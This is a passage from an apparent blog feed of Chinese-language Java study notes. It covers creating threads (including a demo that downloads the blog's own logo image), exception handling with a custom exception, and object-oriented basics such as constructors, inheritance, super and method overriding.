class="hljs-string">&quot;http://121.196.162.32/blog/usr/themes/cactus/images/logo.png&quot;</span>,<span class="hljs-string">&quot;logo&quot;</span>);<br>        Demo1 tmp_2=<span class="hljs-keyword">new</span> Demo1(<span class="hljs-string">&quot;http://121.196.162.32/blog/usr/themes/cactus/images/logo.png&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>);<br>        Demo1 tmp_3=<span class="hljs-keyword">new</span> Demo1(<span class="hljs-string">&quot;http://121.196.162.32/blog/usr/themes/cactus/images/logo.png&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>);<br>        Demo1 tmp_4=<span class="hljs-keyword">new</span> Demo1(<span class="hljs-string">&quot;http://121.196.162.32/blog/usr/themes/cactus/images/logo.png&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>);<br><br>        tmp_1.start();<br>        tmp_2.start();<br>        tmp_3.start();<br>        tmp_4.start();<br>    &#125;<br>&#125;<br><span class="hljs-comment">//下载器</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WebDownloader</span></span>&#123;<br>    <span class="hljs-comment">//下载方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">downloader</span><span class="hljs-params">(String url,String name)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            FileUtils.copyURLToFile(<span class="hljs-keyword">new</span> URL(url),<span class="hljs-keyword">new</span> File(name));<br>        &#125; <span class="hljs-keyword">catch</span> (MalformedURLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>输出就不一定是按照1234的顺序</p><p>第二种方法实现</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//创建线程方式2：实现runnable接口，重写run方法，执行线程需要丢入runnable接口实现类，调用start方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestThread</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Runnable</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">200</span>;i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;代码1：&quot;</span>+i);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">//创建runnable接口的是实现类对象</span><br>        TestThread testThread=<span class="hljs-keyword">new</span> TestThread();<br>        <span class="hljs-comment">//创建线程对象，通过线程对象来开启我们的线程，代理</span><br><br>        Thread thread=<span class="hljs-keyword">new</span> Thread(testThread);<br>        thread.start();<br>        <span class="hljs-comment">//可简写为·new Thread(testThread).start();</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">200</span>;i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;代码2：&quot;</span>+i);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><strong>小结</strong></p><ul><li><p>继承Thread类</p><ul><li><p>子类继承Thread类具备多线程能力</p></li><li><p>启动线程:子类对象. start()</p></li><li><p>不建议使用:避免OOP单继承局限性</p></li></ul></li><li><p>实现Runnable接口</p><ul><li>实现接口Runnable具有多线程能力</li><li>启动线程:传入目标对象+ Thread对象.start()</li><li>推荐使用:避免单继承局限性，灵活方便，方便同-个对象被多个线程使用</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>Java JavaBase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java_base_异常</title>
    <link href="/2021/04/05/Java/JavaBase/java_base_%E5%BC%82%E5%B8%B8/"/>
    <url>/2021/04/05/Java/JavaBase/java_base_%E5%BC%82%E5%B8%B8/</url>
    
    <content type="html"><![CDATA[<h1 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h1><h2 id="简单分类"><a href="#简单分类" class="headerlink" title="简单分类"></a>简单分类</h2><ul><li>要理解Java异常处理是如何工作的，你需要掌握以下三种类型的异常:</li><li>检查性异常:最具代表的检查性异常是用户错误或问题引起的异常，及定程)序贝无法贝光。例如要打开一个不存在文件时，一个异常就发生了，这些异常在编译时不能被简单地忽略。</li><li>运行时异常:运行时异常是可能被程序员避免的异常。与检查性异常相反，运行时异常可以在编译时被忽略。</li><li>错误ERROR:错误不是异常，而是脱离程序员控制的问题。错误在代码中通常被忽略。例如,当栈溢出时，一个错误就发生了，它们在编译也检查不到的。</li></ul><p>异常对象</p><ul><li>Java把异常当作对象来处理，并定义一个基类java.lang.Throwable作为所有异常的超类。</li><li>在Java API中已经定义了许多异常类，这些异常类分为两大类，错误Error和异常Exception。</li></ul><h3 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h3><ul><li>Error类对象由Java虚拟机生成并抛出,大多数错误与代码编写者所执行的操作无关。</li><li>Java虚拟机运行错误(Virtual MachineError)，当VM不再有继续执行操作所需的内存资源时，将出现OutOfMemoryError。这些异常发生时、Java虚拟机(JVM)一般会选择线程终止;</li><li>还有发生在虚拟机试图执行应用时，如类定义错误(NoClassDefFoundError)、链接错误(LinkageError)。这些错误是不可查的，因为它们在应用程序的控制和处理能力之外，而且绝大多数是程序运行时不允许出现的状况。</li></ul><h3 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h3><ul><li><p>在Exception分支中有一个重要的子类RuntimeException(运行时异常)</p><ul><li><p>ArraylndexOutOfBoundsException(数组下标越)</p></li><li><p>NullPointerException(空指针异常)</p></li><li><p>ArithmeticException(算术异常)</p></li><li><p>MissingResourceException(丢失资源)</p></li><li><p>ClassNotFoundException(找不到类）等异常，这些异常是不检查异常，程序中可以选择捕获处理，也可以不处理。</p></li></ul></li><li><p>这些异常一般是由程序逻辑错误引起的，程序应该从逻辑角度尽可能避免这类异常的发生;</p></li><li><p>Error和Exception的区别: Error通常是灾难性的致命的错误，是程序无法控制和处理的，当出现这些异常时，Java虚拟机(JVM)一般会选择终止线程;Exception通常情况下是可以被程序处理的，并且在程序中应该尽可能的去处理这些异常。</p></li></ul><h2 id="异常处理机制"><a href="#异常处理机制" class="headerlink" title="异常处理机制"></a>异常处理机制</h2><ul><li>抛出异常</li><li>捕获异常</li></ul><p>demo1.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ll.javalearn.异常;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">demo1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> a=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">int</span> b=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-comment">//监控区域</span><br>            <span class="hljs-keyword">if</span>(b==<span class="hljs-number">0</span>)&#123;<br>                <span class="hljs-comment">//throw 主动抛出异常一般在方法中使用</span><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArithmeticException();<br>            &#125;<br>            System.out.println(a/<span class="hljs-number">1</span>);<br>        &#125;<span class="hljs-keyword">catch</span> (AbstractMethodError e)&#123;<span class="hljs-comment">//catch(想要捕获的异常类型)可使用多个catch捕捉(从小到大写)</span><br>            <span class="hljs-comment">//出现异常后的处理部分</span><br>            System.out.println(e);<br>        &#125;<span class="hljs-keyword">catch</span>(Throwable e)&#123;<br>            <br>        &#125;<br>        <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-comment">//无论是否出现的处理</span><br>            System.out.println(<span class="hljs-string">&quot;是&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//finally 可以不需要，假设是IO，资源，进行关闭</span><br></code></pre></div></td></tr></table></figure><h2 id="自定义异常"><a href="#自定义异常" class="headerlink" title="自定义异常"></a>自定义异常</h2><ul><li>使用Java内置的异常类可以描述在编程时出现的大部分异常情况。除此之外，用户还可以自定义异常。用户自定义异常类，只需继承Exception类即可。</li><li>在程序中使用自定义异常类，大体可分为以下几个步骤:<ol><li>创建自定义异常类。</li><li>在方法中通过throw关键字抛出异常对象。</li><li>如果在当前抛出异常的方法中处理异常，可以使用try-catch语句捕获并处理;否则在方法的声明处通过throws关键字指明要抛出给方法调用者的异常，继续进行下一步操作</li><li>在出现异常方法的调用者中捕获并处理异常。</li></ol></li></ul><p>MyException.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Exception</span></span>&#123;<br>    <span class="hljs-comment">//传递数字大于10</span><br>    <span class="hljs-keyword">private</span>  <span class="hljs-keyword">int</span> detail;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">MyException</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.detail=a;<br>    &#125;<br>    <span class="hljs-comment">//toString:异常的打印信息</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;MyException&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;detail=&quot;</span> + detail +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><br></code></pre></div></td></tr></table></figure><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span> <span class="hljs-keyword">throws</span> MyException </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;传递的参数为：&quot;</span>+a);<br>        <span class="hljs-keyword">if</span> (a&gt;<span class="hljs-number">10</span>)&#123;<br>            <span class="hljs-keyword">throw</span>  <span class="hljs-keyword">new</span> MyException(a);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;OK&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            test(<span class="hljs-number">11</span>);<br>        &#125;<span class="hljs-keyword">catch</span> (MyException e)&#123;<br>            System.out.println(e);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>实际应用中的总结：</p><ul><li>处理运行时异常时，采用逻辑去合理规避同时辅助try-catch处理</li><li>在多重catch块后面，可以加一个catch (Exception)来处理可能会被遗漏的异常</li><li>对于不确定的代码，也可以加上try-catch，处理潜在的异常</li><li>尽量去处理异常，切忌只是简单地调用printStackTrace()去打印输出</li><li>具体如何处理异常，要根据不同的业务需求和异常类型去决定</li><li>尽量添加finally语句块去释放占用的资源</li></ul>]]></content>
    
    
    <categories>
      
      <category>Java JavaBase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java_base_面向对象</title>
    <link href="/2021/04/03/Java/JavaBase/java_base_%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    <url>/2021/04/03/Java/JavaBase/java_base_%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="java-base-面向对象"><a href="#java-base-面向对象" class="headerlink" title="java_base_面向对象"></a>java_base_面向对象</h1><h2 id="创建对象的内存分析"><a href="#创建对象的内存分析" class="headerlink" title="创建对象的内存分析"></a>创建对象的内存分析</h2><ol><li>首先在java内部分为栈和堆，栈的底部一般是main()、堆又分为方法区和其他</li><li>在执行前会插件一个常量池在堆里 </li><li>new class()时会先在堆中的方法区生成一个相关类的区域有常量池和方法等</li><li>之后在栈中生成一个对象它的地址指向堆中具体的数据</li><li>静态方法是在方法参加时就创建在堆的方法区</li></ol><p>初始值</p><p>数字 0</p><p>char u0000</p><p>boolean false</p><h2 id="面向对象编程-Object-Oriented-Programming-00P"><a href="#面向对象编程-Object-Oriented-Programming-00P" class="headerlink" title="面向对象编程(Object-Oriented Programming, 00P)"></a>面向对象编程(Object-Oriented Programming, 00P)</h2><p>面向对象编程的本质就是:以类的方式组织代码，以对象的组织(封装)数据。</p><p>抽象</p><p>三大特性:</p><p>封装</p><p>继承</p><p>多态</p><p>从认识论角度考虑是先有对象后有类。对象,是具体的事物。类,是抽象的，是对对象的抽象</p><p>从代码运行角度考虑是先有类后有对象。类是对象的模板。</p><p>Student.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ll.javalearn.class_study;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getAge</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(<span class="hljs-keyword">int</span> age)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">study</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-keyword">this</span>.name+<span class="hljs-string">&quot;在学习&quot;</span>);<br>    &#125;<br><br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ll.javalearn.class_study;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">//类：抽象的实例化</span><br>        Student xiao=<span class="hljs-keyword">new</span> Student();<br>        xiao.setName(<span class="hljs-string">&quot;liubi&quot;</span>);<br>        xiao.setAge(<span class="hljs-number">20</span>);<br>        System.out.println(xiao.getName()+<span class="hljs-string">&quot; &quot;</span>+xiao.getAge());<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="初始化对象与创建"><a href="#初始化对象与创建" class="headerlink" title="初始化对象与创建"></a>初始化对象与创建</h2><ul><li><p>使用new关键字创建对象<br>使用new关键字创建的时候，除了分配内存空间之外，还会给创建好的对象进行默认的初始化<br>以及对类中构造器的调用。</p></li><li><p>类中的构造器也称为构造方法，是在进行创建对象的时候必须要调用的。并且构造器有以下俩<br>个特点:</p><ol><li><p>必须和类的名字相同</p></li><li><p> 必须没有返回类型,也不能写void</p></li></ol></li><li><p>构造器必须要掌握</p></li></ul><p>Person.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ll.javalearn.class_study;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    <span class="hljs-comment">//一个类即使什么都没写，它也会存在一个方法</span><br>    <span class="hljs-comment">//显示的定义构造器</span><br>    String name;<br>    <span class="hljs-comment">//实例化初始值</span><br>    <span class="hljs-comment">//1.使用New关键字，本质是在调用构造器</span><br>    <span class="hljs-comment">//2.用来初始化值</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.name=<span class="hljs-string">&quot;liu&quot;</span>;<br>    &#125;<br>    <span class="hljs-comment">//有参构造：一旦定义了有参构造，无参就必须显示定义</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">(String name)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.name=name;<br>    &#125;<br>    <span class="hljs-comment">//alt+insert 跳出常用构造</span><br>    <br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ll.javalearn.class_study;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">//类：抽象的实例化</span><br>        Student xiao=<span class="hljs-keyword">new</span> Student();<br>        xiao.setName(<span class="hljs-string">&quot;liubi&quot;</span>);<br>        xiao.setAge(<span class="hljs-number">20</span>);<br>        System.out.println(xiao.getName()+<span class="hljs-string">&quot; &quot;</span>+xiao.getAge());<br>        <span class="hljs-comment">//new 实例化对象</span><br>        Person person=<span class="hljs-keyword">new</span> Person();<br>        System.out.println(person.name);<br><br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><ul><li><p>该露的露，该藏的藏<br>我们程序设计要追求“高内聚，低耦合”。高内聚就是类的内部数据操作细节自己完成，不允许外部干涉;低耦合:仅暴露少量的方法给外部使用。</p></li><li><p>封装(数据的隐藏)</p><p>通常，应禁止直接访问一个对象中数据的实际表示，而应通过操作接口来访问，这称为信息隐藏。</p></li><li><p>记住这句话就够了:属性私有，get/set</p></li></ul><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><ul><li>继承的本质是对某一批类的抽象，从而实现对现实世界更好的建模。</li><li>extands的意思是“扩展”。子类是父类的扩展。</li><li>JAVA中类只有单继承，没有多继承!</li><li>继承是类和类之间的一种关系。除此之外,类和类之间的关系还有依赖、组合、聚合等。</li><li>继承关系的俩个类，一个为子类(派生类).一个为父类(基类)。子类继承父类,使用关键字extends来表示。</li><li>子类和父类之间,从意义上讲应该具有”is a”的关系.</li><li>object类</li><li>super</li><li>方法重写</li></ul><p>继承之后就会继承父类的全部方法属性（public才行）</p><p><strong>JAVA中所有的类都默认间接或直接的继承Object</strong></p><h2 id="super"><a href="#super" class="headerlink" title="super"></a>super</h2><p>Student.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Person</span></span>&#123;<br>    <span class="hljs-keyword">private</span> String name=<span class="hljs-string">&quot;ll&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">show</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        System.out.println(name);<span class="hljs-comment">//输入的</span><br>        System.out.println(<span class="hljs-keyword">this</span>.name);<span class="hljs-comment">//该类的</span><br>        System.out.println(<span class="hljs-keyword">super</span>.name);<span class="hljs-comment">//父类的</span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>注意创建子类时会默认调用父类的无参构造（super）</p><p>super注意点：</p><ol><li>super调用父类的构造方式，必须在构造方法的第一个</li><li>super必须只能出现在子类的方法或构造方法中</li><li>super和this不能同时调用构造方法！</li></ol><p>Vs this：</p><p>代表的对像不同：</p><p>​    this：本身调用者这个对象</p><p>​    super：代表父类对象的应用</p><p>前提：</p><p>​    this：没有继承也可以使用</p><p>​    super：只能在继承条件中使用</p><p>构造方法</p><p>​    this()：本类的构造</p><p>​    super()：父类的构造</p><h2 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h2><p>重写都是方法的重写和属性无关</p><p>A.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;A.test&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>B.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;B.test&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">//父类的引用指向了子类</span><br>        A b=<span class="hljs-keyword">new</span> B();<br>        <span class="hljs-comment">//方法调用只能和左边，第一的就类型有关</span><br>        A a=<span class="hljs-keyword">new</span> A();<br>        a.test();<span class="hljs-comment">//a.test</span><br>        b.test();<span class="hljs-comment">//b.test</span><br><br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>重写：需要有继承关系，子类重写父类的方法！</p><ol><li>方法名必须相同</li><li>参数列表列表必须相同</li><li>修饰符：范围可以扩大不能缩小；public&gt;protected&gt;default&gt;private</li><li>抛出的异常：范围，可以缩小，但是不能扩大；classNotFoundException–&gt;Exception(大)</li></ol><p>重写：子类的方法和父类必须一致，方法体不同！</p><p>为什么需要重写：</p><ol><li>父类的功能，子类不一定需要，或者不一定满足！</li></ol><p>Alt+Insert ；override</p><h2 id="多态"><a href="#多态" class="headerlink" 